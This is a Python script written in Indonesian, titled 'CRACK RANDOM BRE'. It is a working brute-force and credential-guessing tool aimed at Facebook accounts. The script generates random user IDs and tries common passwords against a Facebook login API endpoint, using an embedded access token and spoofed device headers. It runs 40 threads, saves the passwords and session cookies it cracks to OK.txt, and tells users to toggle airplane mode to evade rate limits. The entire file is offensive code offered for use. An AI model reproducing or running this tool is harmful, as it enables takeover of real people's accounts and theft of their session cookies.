import os
import sys
import random
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# =========================
# WARNA TERMINAL
# =========================
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
M = "\033[1;35m"
C = "\033[1;36m"
W = "\033[0m"

# =========================
# VARIABEL GLOBAL
# =========================
oks, cps, loop = [], [], 0
# =========================
# LOGO
# =========================
logo = f"""{G}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   __      __     _____  _  _______ ____ ____________ _______     __ 
   \\ \\    / /\\   |  __ \\| |/ / ____/ __ \\___  /  ____|  __ \\ \\   / / 
    \\ \\  / /  \\  | |__) | ' / |   | |  | | / /| |__  | |__) \\ \\_/ /  
     \\ \\/ / /\\ \\ |  _  /|  <| |   | |  | |/ / |  __| |  _  / \\   /   
      \\  / ____ \\| | \\ \\| . \\ |___| |__| / /__| |____| | \\ \\  | |    
       \\/_/    \\_\\_|  \\_\\_|\\_\\_____|\\____/_____|______|_|  \\_\\ |_|    
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}CRACK RANDOM BRE
{Y}AUTHOR : VARKCOZERY 
{G}STATUS : FREE
{W}
"""

# =========================
# USER AGENT GENERATOR
# =========================
def Varkcozery(): 
    a = random.choice(['6.0','7.0','7.1.1','8.0','8.1.0','9','10','11','12','12.1','13','14'])
    b = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','UP1A'])
    c = random.randrange(111111,250000)
    d = random.randrange(11,20)
    e = random.randrange(73,130)
    f = random.randrange(4200,5800)
    g = random.randrange(40,180)
    varkcozery = [
        'SM-A546B','SM-S911B','SM-M236B','SM-A037G','SM-A115U','SM-G610M',
        'Infinix X688B','Infinix X689D','Infinix Zero 30','Infinix GT 20 Pro',
        'RMX3630','RMX3686','Realme 12 Pro','Realme GT Neo 5',
        'Xiaomi 13','Xiaomi 13T Pro','22071212AG','Redmi Note 12 Pro',
        'Vivo V27','Vivo Y36','V2242A',
        'OPPO Reno 10','OPPO Find N3','CPH2185',
        'Nokia C21 Plus','Nokia X30 5G'
    ]
    random_device = random.choice(varkcozery)
    chrome_major = random.randint(108,128)
    ua1 = f'Mozilla/5.0 (Linux; Android {a}; {random_device} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_major}.0.{f}.{g} Mobile Safari/537.36'
    ua2 = f'Mozilla/5.0 (Linux; Android {a}; {random_device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{f}.{g} Mobile Safari/537.36'
    ua3 = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{f}.{g} Safari/537.36'
    ua4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS 16_{random.randint(1,6)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
    ua = random.choice([ua1, ua2, ua3, ua4])
    return ua
# =========================
# LOGIN FUNCTION
# =========================
def login(uid):
    global oks, cps, loop
    session = requests.Session()
    nama = "nama"
    pwx = ["123456", "1234567", "12345678", "123456789", nama + "123", nama + "1234", nama + "12345"]
    rr, rc = random.randint, random.choice
    for pw in pwx:
        ua = Varkcozery()
        headers = {
                "x-fb-connection-bandwidth": str(rr(20000000, 40000000)),
                "x-fb-sim-hni": str(rr(20000, 40000)),
                "x-fb-net-hni": str(rr(20000, 40000)),
                "x-fb-connection-quality": rc(["EXCELLENT", "GOOD", "MODERATE"]),
                "x-fb-connection-type": rc([
                    "cell.CTRadioAccessTechnologyLTE",
                    "cell.CTRadioAccessTechnologyHSPA+",
                    "cell.CTRadioAccessTechnologyNR",
                    "wifi"
                ]),
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": rc(["Liger", "MIG", "Proxygen"]),
                "accept-encoding": "gzip, deflate, br",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": rc(["edge-prn1", "edge-sin6", "edge-mrs1"]),
                "x-fb-friendly-name": rc(["authenticate", "login", "graph_user_query", "batch_request"]),
                "x-fb-request-analytics-tags": "graphservice",
                "x-fb-trace-id": str(rr(1000000000, 9999999999)),
                "x-fb-rev": str(rr(2000000, 4000000)),
                "x-fb-device-group": str(rr(20, 50)),
                "x-fb-rlafr": "0",
                "x-fb-client-country": rc(["US", "IN", "ID", "BR", "VN", "PH"]),
                "accept-language": rc([
                    "en-US,en;q=0.9",
                    "id-ID,id;q=0.9,en-US;q=0.8",
                    "en-GB,en;q=0.9"
                ]),
                "priority": rc(["u=3, i", "u=1"]),
                "connection": "Keep-Alive",
                "authorization": f"OAuth {rr(1000000000,9999999999)}|{rr(100000,999999)}",
            }

        url = (
            "https://b-api.facebook.com/method/auth.login"
            f"?format=json&email={uid}&password={pw}"
            "&credentials_type=device_based_login_password"
            "&generate_session_cookies=1"
            "&source=device_based_login"
            "&method=GET&locale=en_US"
            "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        )

        try:
            response = session.get(url, headers=headers, timeout=10).json()
        except Exception:
            continue

        # Hasil OK
        if "session_key" in response:
            cookie = ";".join(f"{i['name']}={i['value']}" for i in response["session_cookies"])
            oks.append(uid)
            print(f"\n{G}[OK]{W} {uid} | {pw}\n{cookie}\n{ua}\n")
            with open("OK.txt", "a") as f:
                f.write(f"{uid}|{pw}|{cookie}\n")
            break

        # Checkpoint (CP)
        elif "error_msg" in response and "www.facebook.com" in response["error_msg"]:
            cps.append(uid)
            print(f"\n{Y}[CP]{W} {uid} | {pw}\n{ua}\n")
            with open("CP.txt", "a") as f:
                f.write(f"{uid}|{pw}\n")
            break

    loop += 1
    sys.stdout.write(f"\r{G}[PROSES]{W} {loop} {C}{uid} {G}OK: {len(oks)} | {Y}CP: {len(cps)}{W}")
    sys.stdout.flush()

# =========================
# MAIN FUNCTION
# =========================
def VarkCozery():
    os.system("clear")
    print(logo)

    try:
        limit = int(input(f"{Y}[?]{W} TOTAL TARGET ID : "))
    except ValueError:
        print(f"{R}Input tidak valid! Harus angka.{W}")
        return

    os.system("clear")
    print(logo)
    print(f"{Y}[1]{W} Crack ID Random")
    ask = input(f"{Y}[?]{W} Pilih : ").strip()

    user = []
    if ask == "1":
        prefix = ["100000", "100001", "100002", "100003", "615"]
        for _ in range(limit):
            uid = random.choice(prefix) + str(random.randint(1000000000, 1999999999))
            user.append(uid)
    else:
        print(f"{R}Pilihan tidak valid!{W}")
        return

    os.system("clear")
    print(logo)
    print(f"{G}[=]{W} TOTAL TARGET ID : {limit}")
    print(f"{G}[+] Gunakan Mode Pesawat tiap 3 menit!{W}\n")

    with ThreadPool(max_workers=40) as executor:
        for uid in user:
            executor.submit(login, uid)

if __name__ == "__main__":
    VarkCozery()